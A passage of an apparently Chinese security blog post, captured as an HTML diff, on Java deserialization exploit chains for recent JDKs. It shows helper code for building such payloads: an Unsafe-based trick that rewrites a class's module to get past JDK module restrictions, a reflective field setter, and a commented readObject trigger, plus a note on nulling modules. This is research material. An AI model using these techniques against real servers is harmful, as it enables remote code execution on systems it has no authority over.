class="comment">//        FileInputStream fis = new FileInputStream(&quot;bin&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(fis);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line"><span class="comment">//        ois.close();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class clazz,Class goalclass)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">UnsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> UnsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ObjectModule</span> <span class="operator">=</span> Class.class.getMethod(<span class="string">&quot;getModule&quot;</span>).invoke(goalclass);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> clazz;</span><br><span class="line">            <span class="type">long</span> addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">            unsafe.getAndSetObject(currentClass,addr,ObjectModule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object templates, String name, Object values)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(templates,values);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实参考文章中还提到了一种做法，将调用和被调用的Module都改为null，因为Module不可以序列化但是null可以被序列化</p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/09/24/Jackson/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Jackson-Chain</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/09/17/Spring%E9%80%9A%E6%9D%80%E9%AB%98%E7%89%88%E6%9C%ACjdk/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Spring原生链通杀高版本jdk</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
